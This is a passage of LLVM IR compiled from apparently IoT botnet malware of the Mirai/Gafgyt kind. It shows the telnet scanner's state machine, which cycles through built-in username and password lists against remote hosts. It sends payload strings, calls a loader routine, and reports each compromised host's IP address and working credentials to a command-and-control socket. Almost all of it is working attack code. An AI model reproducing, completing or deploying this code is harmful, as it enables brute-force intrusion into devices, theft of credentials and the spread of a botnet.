  %1855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1854
  %1856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1855, i32 0, i32 2
  store i8 7, i8* %1856, align 8
  br label %1857

; <label>:1857:                                   ; preds = %1852
  %1858 = load i32, i32* %2, align 4
  %1859 = sext i32 %1858 to i64
  %1860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1859
  %1861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1860, i32 0, i32 8
  %1862 = load i8*, i8** %1861, align 8
  call void @llvm.memset.p0i8.i64(i8* %1862, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1863:                                   ; preds = %1797
  %1864 = load i32, i32* %2, align 4
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1865
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1866, i32 0, i32 8
  %1868 = load i8*, i8** %1867, align 8
  %1869 = call i64 @strlen(i8* %1868) #10
  %1870 = trunc i64 %1869 to i16
  %1871 = load i32, i32* %2, align 4
  %1872 = sext i32 %1871 to i64
  %1873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1872
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1873, i32 0, i32 7
  store i16 %1870, i16* %1874, align 16
  br label %1875

; <label>:1875:                                   ; preds = %1863
  %1876 = load i32, i32* %2, align 4
  %1877 = sext i32 %1876 to i64
  %1878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1877
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1878, i32 0, i32 6
  %1880 = load i32, i32* %1879, align 4
  %1881 = add i32 %1880, 10
  %1882 = zext i32 %1881 to i64
  %1883 = call i64 @time(i64* null) #2
  %1884 = icmp slt i64 %1882, %1883
  br i1 %1884, label %1885, label %1900

; <label>:1885:                                   ; preds = %1875
  %1886 = load i32, i32* %2, align 4
  %1887 = sext i32 %1886 to i64
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1887
  %1889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1888, i32 0, i32 0
  %1890 = load i32, i32* %1889, align 16
  %1891 = call i32 @sclose(i32 %1890)
  %1892 = load i32, i32* %2, align 4
  %1893 = sext i32 %1892 to i64
  %1894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1893
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1894, i32 0, i32 2
  store i8 0, i8* %1895, align 8
  %1896 = load i32, i32* %2, align 4
  %1897 = sext i32 %1896 to i64
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1897
  %1899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1898, i32 0, i32 3
  store i8 1, i8* %1899, align 1
  br label %1900

; <label>:1900:                                   ; preds = %1885, %1875
  br label %2303

; <label>:1901:                                   ; preds = %69
  %1902 = load i32, i32* %2, align 4
  %1903 = sext i32 %1902 to i64
  %1904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1903
  %1905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1904, i32 0, i32 0
  %1906 = load i32, i32* %1905, align 16
  %1907 = call i64 @send(i32 %1906, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0), i64 4, i32 16384)
  %1908 = icmp slt i64 %1907, 0
  br i1 %1908, label %1909, label %1924

; <label>:1909:                                   ; preds = %1901
  %1910 = load i32, i32* %2, align 4
  %1911 = sext i32 %1910 to i64
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1911
  %1913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1912, i32 0, i32 0
  %1914 = load i32, i32* %1913, align 16
  %1915 = call i32 @sclose(i32 %1914)
  %1916 = load i32, i32* %2, align 4
  %1917 = sext i32 %1916 to i64
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1917
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1918, i32 0, i32 2
  store i8 0, i8* %1919, align 8
  %1920 = load i32, i32* %2, align 4
  %1921 = sext i32 %1920 to i64
  %1922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1921
  %1923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1922, i32 0, i32 3
  store i8 1, i8* %1923, align 1
  br label %2304

; <label>:1924:                                   ; preds = %1901
  %1925 = load i32, i32* %2, align 4
  %1926 = sext i32 %1925 to i64
  %1927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1926
  %1928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1927, i32 0, i32 2
  store i8 8, i8* %1928, align 8
  br label %2303

; <label>:1929:                                   ; preds = %69
  %1930 = load i32, i32* %2, align 4
  %1931 = sext i32 %1930 to i64
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1931
  %1933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1932, i32 0, i32 0
  %1934 = load i32, i32* %1933, align 16
  %1935 = call i64 @send(i32 %1934, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i64 7, i32 16384)
  %1936 = icmp slt i64 %1935, 0
  br i1 %1936, label %1937, label %1952

; <label>:1937:                                   ; preds = %1929
  %1938 = load i32, i32* %2, align 4
  %1939 = sext i32 %1938 to i64
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1939
  %1941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1940, i32 0, i32 0
  %1942 = load i32, i32* %1941, align 16
  %1943 = call i32 @sclose(i32 %1942)
  %1944 = load i32, i32* %2, align 4
  %1945 = sext i32 %1944 to i64
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1945
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1946, i32 0, i32 2
  store i8 0, i8* %1947, align 8
  %1948 = load i32, i32* %2, align 4
  %1949 = sext i32 %1948 to i64
  %1950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1949
  %1951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1950, i32 0, i32 3
  store i8 1, i8* %1951, align 1
  br label %2304

; <label>:1952:                                   ; preds = %1929
  %1953 = load i32, i32* %2, align 4
  %1954 = sext i32 %1953 to i64
  %1955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1954
  %1956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1955, i32 0, i32 2
  store i8 9, i8* %1956, align 8
  br label %2303

; <label>:1957:                                   ; preds = %69
  %1958 = load i32, i32* %2, align 4
  %1959 = sext i32 %1958 to i64
  %1960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1959
  %1961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1960, i32 0, i32 0
  %1962 = load i32, i32* %1961, align 16
  %1963 = call i64 @send(i32 %1962, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %1964 = icmp slt i64 %1963, 0
  br i1 %1964, label %1965, label %1980

; <label>:1965:                                   ; preds = %1957
  %1966 = load i32, i32* %2, align 4
  %1967 = sext i32 %1966 to i64
  %1968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1967
  %1969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1968, i32 0, i32 0
  %1970 = load i32, i32* %1969, align 16
  %1971 = call i32 @sclose(i32 %1970)
  %1972 = load i32, i32* %2, align 4
  %1973 = sext i32 %1972 to i64
  %1974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1973
  %1975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1974, i32 0, i32 2
  store i8 0, i8* %1975, align 8
  %1976 = load i32, i32* %2, align 4
  %1977 = sext i32 %1976 to i64
  %1978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1977
  %1979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1978, i32 0, i32 3
  store i8 1, i8* %1979, align 1
  br label %2304

; <label>:1980:                                   ; preds = %1957
  %1981 = load i32, i32* @mainCommSock, align 4
  %1982 = load i32, i32* %2, align 4
  %1983 = sext i32 %1982 to i64
  %1984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1983
  %1985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1984, i32 0, i32 1
  %1986 = bitcast i32* %1985 to %struct.in_addr*
  %1987 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1986, i32 0, i32 0
  %1988 = load i32, i32* %1987, align 4
  %1989 = call i8* @inet_ntoa(i32 %1988) #2
  %1990 = load i32, i32* %2, align 4
  %1991 = sext i32 %1990 to i64
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1991
  %1993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1992, i32 0, i32 4
  %1994 = load i8, i8* %1993, align 2
  %1995 = zext i8 %1994 to i64
  %1996 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1995
  %1997 = load i8*, i8** %1996, align 8
  %1998 = load i32, i32* %2, align 4
  %1999 = sext i32 %1998 to i64
  %2000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1999
  %2001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2000, i32 0, i32 5
  %2002 = load i8, i8* %2001, align 1
  %2003 = zext i8 %2002 to i64
  %2004 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2003
  %2005 = load i8*, i8** %2004, align 8
  %2006 = call i32 (i32, i8*, ...) @sockprintf(i32 %1981, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %1989, i8* %1997, i8* %2005)
  %2007 = load i32, i32* %2, align 4
  %2008 = sext i32 %2007 to i64
  %2009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2008
  %2010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2009, i32 0, i32 2
  store i8 10, i8* %2010, align 8
  br label %2303

; <label>:2011:                                   ; preds = %69
  call void @echoLoader()
  %2012 = load i32, i32* %2, align 4
  %2013 = sext i32 %2012 to i64
  %2014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2013
  %2015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2014, i32 0, i32 0
  %2016 = load i32, i32* %2015, align 16
  %2017 = call i64 @send(i32 %2016, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.75, i32 0, i32 0), i64 61, i32 16384)
  %2018 = load i32, i32* %2, align 4
  %2019 = sext i32 %2018 to i64
  %2020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2019
  %2021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2020, i32 0, i32 2
  store i8 11, i8* %2021, align 8
  br label %2303

; <label>:2022:                                   ; preds = %69
  %2023 = load i32, i32* %2, align 4
  %2024 = sext i32 %2023 to i64
  %2025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2024
  %2026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2025, i32 0, i32 0
  %2027 = load i32, i32* %2026, align 16
  %2028 = call i64 @send(i32 %2027, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.76, i32 0, i32 0), i64 49, i32 16384)
  %2029 = icmp slt i64 %2028, 0
  br i1 %2029, label %2030, label %2045

; <label>:2030:                                   ; preds = %2022
  %2031 = load i32, i32* %2, align 4
  %2032 = sext i32 %2031 to i64
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2032
  %2034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2033, i32 0, i32 0
  %2035 = load i32, i32* %2034, align 16
  %2036 = call i32 @sclose(i32 %2035)
  %2037 = load i32, i32* %2, align 4
  %2038 = sext i32 %2037 to i64
  %2039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2038
  %2040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2039, i32 0, i32 2
  store i8 0, i8* %2040, align 8
  %2041 = load i32, i32* %2, align 4
  %2042 = sext i32 %2041 to i64
  %2043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2042
  %2044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2043, i32 0, i32 3
  store i8 1, i8* %2044, align 1
  br label %2304

; <label>:2045:                                   ; preds = %2022
  %2046 = load i32, i32* %2, align 4
  %2047 = sext i32 %2046 to i64
  %2048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2047
  %2049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2048, i32 0, i32 2
  store i8 12, i8* %2049, align 8
  br label %2050

; <label>:2050:                                   ; preds = %2045, %69
  %2051 = load i32, i32* %2, align 4
  %2052 = sext i32 %2051 to i64
  %2053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2052
  %2054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2053, i32 0, i32 6
  %2055 = load i32, i32* %2054, align 4
  %2056 = icmp eq i32 %2055, 0
  br i1 %2056, label %2057, label %2064

; <label>:2057:                                   ; preds = %2050
  %2058 = call i64 @time(i64* null) #2
  %2059 = trunc i64 %2058 to i32
  %2060 = load i32, i32* %2, align 4
  %2061 = sext i32 %2060 to i64
  %2062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2061
  %2063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2062, i32 0, i32 6
  store i32 %2059, i32* %2063, align 4
  br label %2064

; <label>:2064:                                   ; preds = %2057, %2050
  %2065 = load i32, i32* %2, align 4
  %2066 = sext i32 %2065 to i64
  %2067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2066
  %2068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2067, i32 0, i32 0
  %2069 = load i32, i32* %2068, align 16
  %2070 = load i32, i32* %2, align 4
  %2071 = sext i32 %2070 to i64
  %2072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2071
  %2073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2072, i32 0, i32 8
  %2074 = load i8*, i8** %2073, align 8
  %2075 = load i32, i32* %2, align 4
  %2076 = sext i32 %2075 to i64
  %2077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2076
  %2078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2077, i32 0, i32 7
  %2079 = load i16, i16* %2078, align 16
  %2080 = zext i16 %2079 to i32
  %2081 = call i32 @readUntil(i32 %2069, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2074, i32 1024, i32 %2080)
  %2082 = icmp ne i32 %2081, 0
  br i1 %2082, label %2083, label %2124

; <label>:2083:                                   ; preds = %2064
  %2084 = load i32, i32* %2, align 4
  %2085 = sext i32 %2084 to i64
  %2086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2085
  %2087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2086, i32 0, i32 6
  store i32 0, i32* %2087, align 4
  %2088 = load i32, i32* %2, align 4
  %2089 = sext i32 %2088 to i64
  %2090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2089
  %2091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2090, i32 0, i32 7
  store i16 0, i16* %2091, align 16
  %2092 = load i32, i32* %2, align 4
  %2093 = sext i32 %2092 to i64
  %2094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2093
  %2095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2094, i32 0, i32 0
  %2096 = load i32, i32* %2095, align 16
  %2097 = call i64 @send(i32 %2096, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2098 = load i32, i32* @mainCommSock, align 4
  %2099 = load i32, i32* %2, align 4
  %2100 = sext i32 %2099 to i64
  %2101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2100
  %2102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2101, i32 0, i32 1
  %2103 = bitcast i32* %2102 to %struct.in_addr*
  %2104 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2103, i32 0, i32 0
  %2105 = load i32, i32* %2104, align 4
  %2106 = call i8* @inet_ntoa(i32 %2105) #2
  %2107 = load i32, i32* %2, align 4
  %2108 = sext i32 %2107 to i64
  %2109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2108
  %2110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2109, i32 0, i32 4
  %2111 = load i8, i8* %2110, align 2
  %2112 = zext i8 %2111 to i64
  %2113 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2112
  %2114 = load i8*, i8** %2113, align 8
  %2115 = load i32, i32* %2, align 4
  %2116 = sext i32 %2115 to i64
  %2117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2116
  %2118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2117, i32 0, i32 5
  %2119 = load i8, i8* %2118, align 1
  %2120 = zext i8 %2119 to i64
  %2121 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2120
  %2122 = load i8*, i8** %2121, align 8
  %2123 = call i32 (i32, i8*, ...) @sockprintf(i32 %2098, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2106, i8* %2114, i8* %2122)
  br label %2304

; <label>:2124:                                   ; preds = %2064
  %2125 = load i32, i32* %2, align 4
  %2126 = sext i32 %2125 to i64
  %2127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2126
  %2128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2127, i32 0, i32 0
  %2129 = load i32, i32* %2128, align 16
  %2130 = load i32, i32* %2, align 4
  %2131 = sext i32 %2130 to i64
  %2132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2131
  %2133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2132, i32 0, i32 8
  %2134 = load i8*, i8** %2133, align 8
  %2135 = load i32, i32* %2, align 4
  %2136 = sext i32 %2135 to i64
  %2137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2136
  %2138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2137, i32 0, i32 7
  %2139 = load i16, i16* %2138, align 16
  %2140 = zext i16 %2139 to i32
  %2141 = call i32 @readUntil(i32 %2129, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2134, i32 1024, i32 %2140)
  %2142 = icmp ne i32 %2141, 0
  br i1 %2142, label %2143, label %2184

; <label>:2143:                                   ; preds = %2124
  %2144 = load i32, i32* %2, align 4
  %2145 = sext i32 %2144 to i64
  %2146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2145
  %2147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2146, i32 0, i32 6
  store i32 0, i32* %2147, align 4
  %2148 = load i32, i32* %2, align 4
  %2149 = sext i32 %2148 to i64
  %2150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2149
  %2151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2150, i32 0, i32 7
  store i16 0, i16* %2151, align 16
  %2152 = load i32, i32* %2, align 4
  %2153 = sext i32 %2152 to i64
  %2154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2153
  %2155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2154, i32 0, i32 0
  %2156 = load i32, i32* %2155, align 16
  %2157 = call i64 @send(i32 %2156, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2158 = load i32, i32* @mainCommSock, align 4
  %2159 = load i32, i32* %2, align 4
  %2160 = sext i32 %2159 to i64
  %2161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2160
  %2162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2161, i32 0, i32 1
  %2163 = bitcast i32* %2162 to %struct.in_addr*
  %2164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2163, i32 0, i32 0
  %2165 = load i32, i32* %2164, align 4
  %2166 = call i8* @inet_ntoa(i32 %2165) #2
  %2167 = load i32, i32* %2, align 4
  %2168 = sext i32 %2167 to i64
  %2169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2168
  %2170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2169, i32 0, i32 4
  %2171 = load i8, i8* %2170, align 2
  %2172 = zext i8 %2171 to i64
  %2173 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2172
  %2174 = load i8*, i8** %2173, align 8
  %2175 = load i32, i32* %2, align 4
  %2176 = sext i32 %2175 to i64
  %2177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2176
  %2178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2177, i32 0, i32 5
  %2179 = load i8, i8* %2178, align 1
  %2180 = zext i8 %2179 to i64
  %2181 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2180
  %2182 = load i8*, i8** %2181, align 8
  %2183 = call i32 (i32, i8*, ...) @sockprintf(i32 %2158, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2166, i8* %2174, i8* %2182)
  br label %2304

; <label>:2184:                                   ; preds = %2124
  %2185 = load i32, i32* %2, align 4
  %2186 = sext i32 %2185 to i64
  %2187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2186
  %2188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2187, i32 0, i32 0
  %2189 = load i32, i32* %2188, align 16
  %2190 = load i32, i32* %2, align 4
  %2191 = sext i32 %2190 to i64
  %2192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2191
  %2193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2192, i32 0, i32 8
  %2194 = load i8*, i8** %2193, align 8
  %2195 = load i32, i32* %2, align 4
  %2196 = sext i32 %2195 to i64
  %2197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2196
  %2198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2197, i32 0, i32 7
  %2199 = load i16, i16* %2198, align 16
  %2200 = zext i16 %2199 to i32
  %2201 = call i32 @readUntil(i32 %2189, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2194, i32 1024, i32 %2200)
  %2202 = icmp ne i32 %2201, 0
  br i1 %2202, label %2203, label %2263

; <label>:2203:                                   ; preds = %2184
  %2204 = load i32, i32* %2, align 4
  %2205 = sext i32 %2204 to i64
  %2206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2205
  %2207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2206, i32 0, i32 6
  store i32 0, i32* %2207, align 4
  %2208 = load i32, i32* %2, align 4
  %2209 = sext i32 %2208 to i64
  %2210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2209
  %2211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2210, i32 0, i32 7
  store i16 0, i16* %2211, align 16
  %2212 = load i32, i32* %2, align 4
  %2213 = sext i32 %2212 to i64
  %2214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2213
  %2215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2214, i32 0, i32 0
  %2216 = load i32, i32* %2215, align 16
  %2217 = call i64 @send(i32 %2216, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2218 = load i32, i32* @mainCommSock, align 4
  %2219 = load i32, i32* %2, align 4
  %2220 = sext i32 %2219 to i64
  %2221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2220
  %2222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2221, i32 0, i32 1
  %2223 = bitcast i32* %2222 to %struct.in_addr*
  %2224 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2223, i32 0, i32 0
  %2225 = load i32, i32* %2224, align 4
  %2226 = call i8* @inet_ntoa(i32 %2225) #2
  %2227 = load i32, i32* %2, align 4
  %2228 = sext i32 %2227 to i64
  %2229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2228
  %2230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2229, i32 0, i32 4
  %2231 = load i8, i8* %2230, align 2
  %2232 = zext i8 %2231 to i64
  %2233 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2232
  %2234 = load i8*, i8** %2233, align 8
  %2235 = load i32, i32* %2, align 4
  %2236 = sext i32 %2235 to i64
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2236
  %2238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2237, i32 0, i32 5
  %2239 = load i8, i8* %2238, align 1
  %2240 = zext i8 %2239 to i64
  %2241 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2240
  %2242 = load i8*, i8** %2241, align 8
  %2243 = call i32 (i32, i8*, ...) @sockprintf(i32 %2218, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2226, i8* %2234, i8* %2242)
  %2244 = load i32, i32* %2, align 4
  %2245 = sext i32 %2244 to i64
  %2246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2245
  %2247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2246, i32 0, i32 8
  %2248 = load i8*, i8** %2247, align 8
  call void @llvm.memset.p0i8.i64(i8* %2248, i8 0, i64 1024, i32 1, i1 false)
  %2249 = load i32, i32* %2, align 4
  %2250 = sext i32 %2249 to i64
  %2251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2250
  %2252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2251, i32 0, i32 0
  %2253 = load i32, i32* %2252, align 16
  %2254 = call i32 @sclose(i32 %2253)
  %2255 = load i32, i32* %2, align 4
  %2256 = sext i32 %2255 to i64
  %2257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2256
  %2258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2257, i32 0, i32 3
  store i8 1, i8* %2258, align 1
  %2259 = load i32, i32* %2, align 4
  %2260 = sext i32 %2259 to i64
  %2261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2260
  %2262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2261, i32 0, i32 2
  store i8 0, i8* %2262, align 8
  br label %2304

; <label>:2263:                                   ; preds = %2184
  %2264 = load i32, i32* %2, align 4
  %2265 = sext i32 %2264 to i64
  %2266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2265
  %2267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2266, i32 0, i32 8
  %2268 = load i8*, i8** %2267, align 8
  %2269 = call i64 @strlen(i8* %2268) #10
  %2270 = trunc i64 %2269 to i16
  %2271 = load i32, i32* %2, align 4
  %2272 = sext i32 %2271 to i64
  %2273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2272
  %2274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2273, i32 0, i32 7
  store i16 %2270, i16* %2274, align 16
  br label %2275

; <label>:2275:                                   ; preds = %2263
  br label %2276

; <label>:2276:                                   ; preds = %2275
  br label %2277

; <label>:2277:                                   ; preds = %2276
  %2278 = load i32, i32* %2, align 4
  %2279 = sext i32 %2278 to i64
  %2280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2279
  %2281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2280, i32 0, i32 6
  %2282 = load i32, i32* %2281, align 4
  %2283 = add i32 %2282, 10
  %2284 = zext i32 %2283 to i64
  %2285 = call i64 @time(i64* null) #2
  %2286 = icmp slt i64 %2284, %2285
  br i1 %2286, label %2287, label %2302

; <label>:2287:                                   ; preds = %2277
  %2288 = load i32, i32* %2, align 4
  %2289 = sext i32 %2288 to i64
  %2290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2289
  %2291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2290, i32 0, i32 0
  %2292 = load i32, i32* %2291, align 16
  %2293 = call i32 @sclose(i32 %2292)
  %2294 = load i32, i32* %2, align 4
